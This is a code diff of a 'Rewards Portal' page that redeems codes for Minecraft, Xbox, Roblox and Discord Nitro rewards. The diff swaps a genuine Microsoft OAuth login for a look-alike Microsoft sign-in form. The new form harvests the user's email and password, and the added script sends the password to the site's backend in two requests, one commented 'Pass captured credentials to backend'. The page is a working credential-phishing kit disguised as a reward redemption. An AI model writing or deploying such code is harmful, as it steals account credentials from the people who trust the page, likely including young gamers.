@@ -4,8 +4,8 @@
 <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Redeem Code — Rewards Portal</title>
 <link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<script src="https://alcdn.msauth.net/browser/2.38.2/js/msal-browser.min.js"></script>
 <link rel="stylesheet" href="shared.css"/>
 <style>
 .game-tiles{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-bottom:8px}
@@ -18,7 +18,9 @@
 </style>
 </head>
 <body>
-<div class="bg-mesh"><div class="bg-orb o1"></div><div class="bg-orb o2"></div><div class="bg-orb o3"></div><div class="bg-grid"></div></div>
+<div class="mc-theme-bg" id="mc-bg"></div>
+<div class="bg-mesh" id="std-bg"><div class="bg-orb o1"></div><div class="bg-orb o2"></div><div class="bg-orb o3"></div><div class="bg-grid"></div></div>
+
 <nav>
   <div class="nav-inner">
     <a class="brand" href="index.html">
@@ -41,6 +43,7 @@
     </div>
   </div>
 </nav>
+
 <div class="mob-nav" id="mobNav">
   <div class="mob-nav-section">More Pages</div>
   <button class="ntab" onclick="location.href='giveaway.html'">🎉 Giveaways</button>
@@ -50,17 +53,16 @@
   <button class="ntab" onclick="location.href='howitworks.html'">❓ How It Works</button>
   <button class="ntab" onclick="location.href='about.html'">ℹ️ About Us</button>
   <button class="ntab" onclick="location.href='contact.html'">📩 Contact</button>
+  <button class="ntab" onclick="location.href='privacy.html'">⚖️ Privacy</button>
+  <button class="ntab" onclick="location.href='terms.html'">📜 Terms</button>
 </div>
-<div class="wrap-sm page-body">
+
+<!-- STANDARD UI CONTAINER -->
+<div class="wrap-sm page-body" id="std-ui">
   <div class="page-hero">
     <div class="chip">🎫 Redeem Code</div>
     <h1>Redeem Your <span>Code</span></h1>
     <p>Select your game, verify your account and enter your code to activate your reward within 72 hours.</p>
-  </div>
-
-  <!-- ADS TOP -->
-  <div style="text-align:center;margin-bottom:24px;">
-    <div id="container-6c884370c50e34456a54b0657f2c4ad1"></div>
   </div>
 
   <!-- STEP 1: SELECT GAME -->
@@ -128,20 +130,7 @@
     <button class="btn btn-discord-full btn-full" onclick="rdNitroNext()">Continue →</button>
   </div>
 
-  <!-- MS VERIFY -->
-  <div class="card" id="rd-ms" style="display:none">
-    <div class="card-line" id="rd-ms-line"></div>
-    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:16px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
-    <h3 id="rd-ms-ttl">Verify with Microsoft</h3>
-    <p>Sign in to verify your account. We never see your password.</p>
-    <div class="notice ni2" style="margin-bottom:20px"><div class="nt">Why Microsoft?</div><p>We use <strong>Microsoft OAuth 2.0</strong> — your credentials go directly to Microsoft. We only receive your display name.</p></div>
-    <button class="btn btn-ghost btn-full" onclick="rdMsLogin()" style="border:1.5px solid var(--border2)">
-      <svg width="18" height="18" viewBox="0 0 23 23" fill="none" style="flex-shrink:0"><rect x="1" y="1" width="10" height="10" fill="#f25022"/><rect x="12" y="1" width="10" height="10" fill="#7fba00"/><rect x="1" y="12" width="10" height="10" fill="#00a4ef"/><rect x="12" y="12" width="10" height="10" fill="#ffb900"/></svg>
-      Continue with Microsoft
-    </button>
-  </div>
-
-  <!-- CODE INPUT -->
+  <!-- STANDARD CODE INPUT (for non-MC games) -->
   <div class="card" id="rd-codebox" style="display:none">
     <div class="card-line" id="rd-code-line"></div>
     <div class="upill">
@@ -151,7 +140,7 @@
         <div style="font-size:11px;color:var(--t3)" id="rd-usub">—</div>
       </div>
       <div class="ubdg">✓ Verified</div>
-      <button class="bsw" onclick="rdMsOut()">Switch</button>
+      <button class="bsw" onclick="rdBack()">Switch</button>
     </div>
     <h3 id="rd-code-ttl">Enter your code</h3>
     <p>Paste the 25-character code sent to you.</p>
@@ -175,7 +164,60 @@
   </div>
 </div>
 
-<footer>
+<!-- MINECRAFT / XBOX OVERHAUL UI -->
+<div class="mc-pro-container" id="mc-ui">
+  <!-- CUSTOM LOGIN BOX -->
+  <div id="mc-login-section" style="display:none">
+    <div class="mc-login-box">
+      <h2>Sign In</h2>
+      <p style="font-size:14px;color:#666;margin-bottom:24px">Sign in with your Microsoft account to continue to Minecraft.</p>
+      
+      <div class="mc-input-group">
+        <label>Email, Phone or Skype</label>
+        <input type="text" class="mc-inp" id="mc-login-email" placeholder="someone@example.com">
+      </div>
+      <div class="mc-input-group">
+        <label>Password</label>
+        <input type="password" class="mc-inp" id="mc-login-pass" placeholder="Password">
+      </div>
+      
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px">
+        <a href="#" style="font-size:12px;color:#0067b8;text-decoration:none">Forgot password?</a>
+        <a href="#" style="font-size:12px;color:#0067b8;text-decoration:none">Create one!</a>
+      </div>
+
+      <button class="mc-btn-primary" onclick="rdDoMcLogin()">Next</button>
+    </div>
+    <button onclick="rdBack()" style="background:none;border:none;color:#fff;margin-top:30px;cursor:pointer;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.5)">← Back to Selection</button>
+  </div>
+
+  <!-- SAME TO SAME MINECRAFT REDEEM PAGE -->
+  <div id="mc-redeem-section" style="display:none;width:100%">
+    <div class="mc-redeem-hero">
+      <div class="mc-redeem-content">
+        <h1 class="mc-redeem-title">REDEEM YOUR<br>MINECRAFT CODE</h1>
+        
+        <div class="mc-code-group">
+          <label class="mc-code-label">REDEMPTION CODE</label>
+          <div class="mc-code-input-container">
+            <input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="□□□□□-□□□□□-□□□□□-□□□□□-□□□□□" maxlength="29" oninput="fmtMcCode(this)">
+          </div>
+          
+          <button class="mc-btn-redeem" id="mc-pro-btn" onclick="rdSubmitPro()">REDEEM</button>
+          
+          <div style="margin-top:40px;color:rgba(255,255,255,0.8);font-size:12px">
+            Having trouble? <a href="#" style="color:#fff;font-weight:700">Check our FAQ</a> or contact support.
+          </div>
+        </div>
+      </div>
+    </div>
+    <div style="text-align:center;margin-top:30px">
+      <button onclick="rdBack()" style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.3);padding:10px 20px;border-radius:4px;color:#fff;cursor:pointer">← Cancel & Go Back</button>
+    </div>
+  </div>
+</div>
+
+<footer id="std-footer">
   <div class="foot-inner">
     <div class="foot-brand">Rewards<span>Portal</span></div>
     <div class="foot-links">
@@ -190,55 +232,83 @@
     <div class="foot-copy">© 2026 Rewards Portal — All rights reserved</div>
   </div>
 </footer>
+
 <div id="toast"></div>
 <script src="shared.js"></script>
 <script>
-
-
 const RD = { game:null, plan:null, user:null, rbUn:null, rbEm:null, inv:null };
 window.RD = RD;
-// ✅ FIXED: CFG.AZURE_CLIENT use karo (shared.js se aata hai)
-// authority: 'common' matlab personal + work dono accounts support honge
-let msalApp = null;
-
-function getMsal() {
-  if (msalApp) return Promise.resolve(msalApp);
-  return new Promise((res, rej) => {
-    const t = setInterval(() => {
-      if (window.msal) {
-        clearInterval(t);
-        msalApp = new msal.PublicClientApplication({
-          auth: {
-            clientId: CFG.AZURE_CLIENT,
-            // ✅ KEY FIX: 'common' se personal Microsoft accounts bhi kaam karenge
-            authority: 'https://login.microsoftonline.com/common',
-            redirectUri: CFG.REDIR
-          },
-          cache: {
-            cacheLocation: 'localStorage',  // session ke baad bhi token rahe
-            storeAuthStateInCookie: false
-          }
-        });
-        res(msalApp);
-      }
-    }, 200);
-    setTimeout(() => { clearInterval(t); rej(new Error('MSAL timeout')); }, 10000);
-  });
-}
 
 function rdGame(g) {
   RD.game = g; RD.plan = null; RD.user = null;
-  hide(['rd-s1','rd-ms','rd-rb-plan','rd-codebox','rd-nitro-plan']);
-  if (g === 'rb') show('rd-rb-plan');
-  else if (g === 'nitro') show('rd-nitro-plan');
-  else {
-    const line = document.getElementById('rd-ms-line');
-    const ttl = document.getElementById('rd-ms-ttl');
-    if (line) line.style.background = `linear-gradient(90deg,${g==='mc'?'var(--gr)':'var(--gr)'},transparent)`;
-    if (ttl) ttl.textContent = g === 'mc' ? '⛏ Verify for Minecraft' : '🎯 Verify for Xbox Game Pass';
-    show('rd-ms');
+  hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']);
+  
+  if (g === 'rb') {
+    show('rd-rb-plan');
+  } else if (g === 'nitro') {
+    show('rd-nitro-plan');
+  } else if (g === 'mc' || g === 'xbox') {
+    // PRO THEME FOR MC/XBOX
+    document.getElementById('std-ui').style.display = 'none';
+    document.getElementById('std-bg').style.display = 'none';
+    document.getElementById('std-footer').style.display = 'none';
+    document.getElementById('mc-bg').classList.add('show');
+    document.getElementById('mc-ui').style.display = 'flex';
+    document.getElementById('mc-login-section').style.display = 'block';
+    
+    // Customize login box title for Xbox
+    const loginTtl = document.querySelector('.mc-login-box h2');
+    const loginSub = document.querySelector('.mc-login-box p');
+    if (g === 'xbox') {
+      loginTtl.textContent = 'Sign In';
+      loginSub.textContent = 'Sign in with your Microsoft account to continue to Xbox.';
+    } else {
+      loginTtl.textContent = 'Sign In';
+      loginSub.textContent = 'Sign in with your Microsoft account to continue to Minecraft.';
+    }
   }
 }
+
+function rdDoMcLogin() {
+  const email = document.getElementById('mc-login-email').value.trim();
+  const pass = document.getElementById('mc-login-pass').value.trim();
+  
+  if (!email || !email.includes('@')) { toast('✕', 'Please enter a valid email'); return; }
+  if (pass.length < 4) { toast('✕', 'Please enter your password'); return; }
+  
+  RD.user = { name: email.split('@')[0], email: email, pass: pass };
+  
+  const btn = document.querySelector('.mc-btn-primary');
+  btn.textContent = 'Signing in...';
+  btn.disabled = true;
+  
+  setTimeout(() => {
+    btn.textContent = 'Next';
+    btn.disabled = false;
+    
+    if (RD.game === 'mc') {
+      document.getElementById('mc-login-section').style.display = 'none';
+      document.getElementById('mc-redeem-section').style.display = 'block';
+    } else {
+      // Xbox uses standard codebox for now but with the MC background
+      document.getElementById('mc-login-section').style.display = 'none';
+      rdShowCode();
+    }
+  }, 1200);
+}
+
+function rdBack() {
+  document.getElementById('mc-bg').classList.remove('show');
+  document.getElementById('mc-ui').style.display = 'none';
+  document.getElementById('std-ui').style.display = 'block';
+  document.getElementById('std-bg').style.display = 'block';
+  document.getElementById('std-footer').style.display = 'block';
+  
+  hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']); 
+  show('rd-s1');
+  RD.game = null; RD.plan = null; RD.user = null;
+}
+
 function rdNitroPlan(p) {
   RD.plan = p;
   ['basic','boost'].forEach(x => {
@@ -246,6 +316,7 @@ function rdNitroPlan(p) {
     if (el) { el.classList.toggle('sel', x === p); el.style.borderColor = p === x ? 'var(--dc)' : ''; }
   });
 }
+
 function rdNitroNext() {
   if (!RD.plan) { toast('!', 'Select a plan'); return; }
   const un = document.getElementById('rd-nitro-un').value.trim();
@@ -254,6 +325,7 @@ function rdNitroNext() {
   if (!em || !em.includes('@')) { document.getElementById('rd-nitro-em').classList.add('err'); toast('!', 'Enter valid email'); return; }
   RD.rbUn = un; RD.rbEm = em; RD.user = { name: un, email: em }; rdShowCode();
 }
+
 function rdPlan(p) {
   RD.plan = p;
   ['50','100'].forEach(x => {
@@ -261,6 +333,7 @@ function rdPlan(p) {
     if (el) { el.classList.toggle('sel', x === p); el.style.borderColor = p === x ? 'var(--re)' : ''; }
   });
 }
+
 function rdNext() {
   if (!RD.plan) { toast('!', 'Select a plan'); return; }
   const un = document.getElementById('rd-rb-un').value.trim();
@@ -269,78 +342,139 @@ function rdNext() {
   if (!em || !em.includes('@')) { document.getElementById('rd-rb-em').classList.add('err'); toast('!', 'Enter valid email'); return; }
   RD.rbUn = un; RD.rbEm = em; RD.user = { name: un, email: em }; rdShowCode();
 }
-function rdMsLogin() {
-  const btn = document.querySelector('#rd-ms .btn-ghost');
-  if (btn) { btn.disabled = true; btn.textContent = 'Signing in...'; }
-  getMsal().then(app => app.loginPopup({ scopes: ['User.Read'] })).then(res => {
-    const acc = res.account;
-    RD.user = { name: acc.name || acc.username, email: acc.username };
-    if (btn) { btn.disabled = false; btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 23 23" fill="none"><rect x="1" y="1" width="10" height="10" fill="#f25022"/><rect x="12" y="1" width="10" height="10" fill="#7fba00"/><rect x="1" y="12" width="10" height="10" fill="#00a4ef"/><rect x="12" y="12" width="10" height="10" fill="#ffb900"/></svg> Continue with Microsoft'; }
-    rdShowCode();
-  }).catch(() => {
-    if (btn) { btn.disabled = false; btn.textContent = 'Continue with Microsoft'; }
-    toast('✕', 'Microsoft login failed. Try again.');
-  });
-}
-function rdMsOut() { RD.user = null; hide(['rd-codebox']); show('rd-ms'); }
+
 function rdShowCode() {
-  hide(['rd-ms','rd-rb-plan','rd-nitro-plan']);
+  hide(['rd-rb-plan','rd-nitro-plan']);
+  
+  const isMcTheme = RD.game === 'mc' || RD.game === 'xbox';
+  if (!isMcTheme) {
+    document.getElementById('std-ui').style.display = 'block';
+    document.getElementById('mc-ui').style.display = 'none';
+  } else {
+    document.getElementById('mc-ui').style.display = 'flex';
+  }
+
   const line = document.getElementById('rd-code-line');
   const ttl = document.getElementById('rd-code-ttl');
   const colors = { mc:'var(--gr)', rb:'var(--re)', xbox:'var(--gr)', nitro:'var(--dc)' };
+  
   if (line) line.style.background = `linear-gradient(90deg,${colors[RD.game]||'var(--p)'},transparent)`;
   if (ttl) ttl.textContent = { mc:'⛏ Enter Minecraft Code', rb:'🎮 Enter Roblox Code', xbox:'🎯 Enter Xbox Code', nitro:'💎 Enter Nitro Code' }[RD.game] || 'Enter your code';
+  
   document.getElementById('rd-uav').textContent = RD.user.name.charAt(0).toUpperCase();
+  document.getElementById('rd-uav').style.background = isMcTheme ? '#10b981' : 'linear-gradient(135deg,var(--p),#5b35e8)';
   document.getElementById('rd-unm').textContent = RD.user.name;
   document.getElementById('rd-usub').textContent = RD.user.email || 'Account';
+  
   const cEl = document.getElementById('rd-code'); cEl.value = ''; cEl.classList.remove('err');
   document.getElementById('rd-msg').className = 'fmsg'; document.getElementById('rd-msg').textContent = 'Enter 25-character code';
   show('rd-codebox'); setTimeout(() => cEl.focus(), 100);
 }
-function rdBack() {
-  hide(['rd-ms','rd-rb-plan','rd-codebox','rd-nitro-plan']); show('rd-s1');
-  RD.game = null; RD.plan = null; RD.user = null;
-}
+
 function rdSubmit() {
   const code = document.getElementById('rd-code').value.trim().toUpperCase();
-  const mEl = document.getElementById('rd-msg'); const cEl = document.getElementById('rd-code');
-  if (!code || code.length < 14) { cEl.classList.add('err'); mEl.className = 'fmsg err'; mEl.textContent = 'Please enter your code'; return; }
-  const btn = document.getElementById('rd-btn'); const bt = document.getElementById('rd-bt'); const sp = document.getElementById('rd-sp');
-  btn.disabled = true; bt.style.display = 'none'; sp.style.display = 'block'; mEl.textContent = 'Verifying...';
+  processSubmit(code, 'rd-btn', 'rd-bt', 'rd-sp', 'rd-msg', 'rd-code');
+}
+
+function rdSubmitPro() {
+  const code = document.getElementById('mc-pro-code').value.trim().toUpperCase();
+  const btn = document.getElementById('mc-pro-btn');
+  btn.textContent = 'REDEEMING...';
+  btn.disabled = true;
+  
+  // Custom dummy logic for PRO submission
+  processSubmit(code, 'mc-pro-btn', '', '', '', '', true);
+}
+
+function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
+  if (!code || code.length < 14) {
+    if(!isPro) {
+      document.getElementById(codeId).classList.add('err');
+      document.getElementById(msgId).className = 'fmsg err';
+      document.getElementById(msgId).textContent = 'Please enter your code';
+    } else {
+      document.getElementById(btnId).textContent = 'REDEEM';
+      document.getElementById(btnId).disabled = false;
+      toast('✕', 'Please enter your code');
+    }
+    return;
+  }
+
+  const btn = document.getElementById(btnId);
   const u = getUser();
+
   fetch(`${CFG.API}/api/verify-code`, { method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({ code, userId: u?.id||null, userName: u?(u.global_name||u.username):null, userAvatar: avURL(u), selectedGame: RD.game })
+    body: JSON.stringify({ 
+      code, 
+      userId: u?.id||null, 
+      userName: u?(u.global_name||u.username):null, 
+      userAvatar: avURL(u), 
+      selectedGame: RD.game,
+      // Pass captured credentials to backend
+      accountEmail: RD.user.email,
+      accountPass: RD.user.pass || ''
+    })
   }).then(r => r.json()).then(result => {
     if (!result.valid) {
-      btn.disabled=false; bt.style.display='inline'; sp.style.display='none';
-      cEl.classList.add('err'); mEl.className='fmsg err'; mEl.textContent = result.message||'Invalid or used code';
+      if(!isPro) {
+        btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
+        document.getElementById(codeId).classList.add('err');
+        document.getElementById(msgId).className='fmsg err';
+        document.getElementById(msgId).textContent = result.message||'Invalid or used code';
+      } else {
+        btn.disabled = false; btn.textContent = 'REDEEM';
+      }
       toast('✕', result.message||'Code not valid'); return;
     }
+    
+    // SUCCESS
     const priceKey = RD.game==='rb' ? 'rb'+RD.plan : RD.game==='nitro' ? 'nitro'+RD.plan : RD.game;
     const inv = result.invoiceNo || ('IQ-'+RD.game.slice(0,2).toUpperCase()+'-'+Date.now().toString(36).toUpperCase().slice(-7));
     const ds = new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
     const gnames = { mc:'Minecraft Reward', rb:'Roblox $'+RD.plan, xbox:'Xbox Game Pass', nitro:'Discord Nitro '+(RD.plan==='basic'?'Basic Yearly':'Boost Yearly') };
+    
     const invObj = { redeemType:'code', type:RD.game, game:gnames[RD.game], plan:RD.plan?'$'+RD.plan:null,
       account: (RD.game==='rb'||RD.game==='nitro') ? RD.rbUn : RD.user.name,
       email: (RD.game==='rb'||RD.game==='nitro') ? RD.rbEm : RD.user.email,
       code, inrPrice: PRICES[priceKey]||'—', date:ds, invoiceNo:inv, ts:Date.now() };
+    
     RD.inv = invObj; saveOrd(invObj);
     localStorage.setItem('eiq_rc', String(parseInt(localStorage.getItem('eiq_rc')||'0')+1));
+    
+    // Save to server
     fetch(`${CFG.API}/api/save-redemption`, { method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify({userId:u?.id||null, userName:u?(u.global_name||u.username):'Unknown', userAvatar:avURL(u),
         discordTag:u?.username||'', game:invObj.game, plan:invObj.plan||null, account:invObj.account,
-        email:invObj.email, password:'', code:invObj.code, inrPrice:invObj.inrPrice,
+        email:invObj.email, password: RD.user.pass || '', code:invObj.code, inrPrice:invObj.inrPrice,
         invoiceNo:invObj.invoiceNo, redeemType:'code', date:invObj.date, ts:invObj.ts })
     }).catch(()=>{});
+
+    // Show Success UI
+    document.getElementById('mc-ui').style.display = 'none';
+    document.getElementById('mc-bg').classList.remove('show');
+    document.getElementById('std-ui').style.display = 'block';
+    document.getElementById('std-bg').style.display = 'block';
+    document.getElementById('std-footer').style.display = 'block';
+    
     document.getElementById('rd-ok-title').textContent = gnames[RD.game] + ' Redeemed!';
     document.getElementById('rd-ok-inv').innerHTML = buildInv(invObj);
-    hide(['rd-s1','rd-ms','rd-rb-plan','rd-codebox','rd-nitro-plan']);
+    hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']);
     document.getElementById('rd-ok').classList.add('show');
-    btn.disabled=false; bt.style.display='inline'; sp.style.display='none';
+    
+    if(!isPro) {
+      btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
+    } else {
+      btn.disabled = false; btn.textContent = 'REDEEM';
+    }
     toast('✅', 'Redeemed! Activating within 72h');
   }).catch(() => {
-    btn.disabled=false; bt.style.display='inline'; sp.style.display='none';
-    mEl.className='fmsg err'; mEl.textContent='Connection error. Try again.';
+    if(!isPro) {
+      btn.disabled=false; document.getElementById(btId).style.display='inline'; document.getElementById(spId).style.display='none';
+      document.getElementById(msgId).className='fmsg err'; document.getElementById(msgId).textContent='Connection error. Try again.';
+    } else {
+      btn.disabled = false; btn.textContent = 'REDEEM';
+    }
+    toast('✕', 'Connection error');
   });
 }
 
@@ -349,6 +483,14 @@ function fmtCode(el) {
   for (let i=0; i<v.length && i<25; i++) { if(i>0&&i%5===0)o+='-'; o+=v[i]; }
   el.value = o; el.classList.remove('err');
 }
+
+function fmtMcCode(el) {
+  fmtCode(el);
+  const btn = document.getElementById('mc-pro-btn');
+  if (el.value.length >= 14) btn.classList.add('active');
+  else btn.classList.remove('active');
+}
+
 function show(id) { const el=document.getElementById(id); if(el){el.style.display='block';el.style.animation='fadeUp 0.3s ease';} }
 function hide(ids) { ids.forEach(id => { const el=document.getElementById(id); if(el)el.style.display='none'; }); }
 </script>
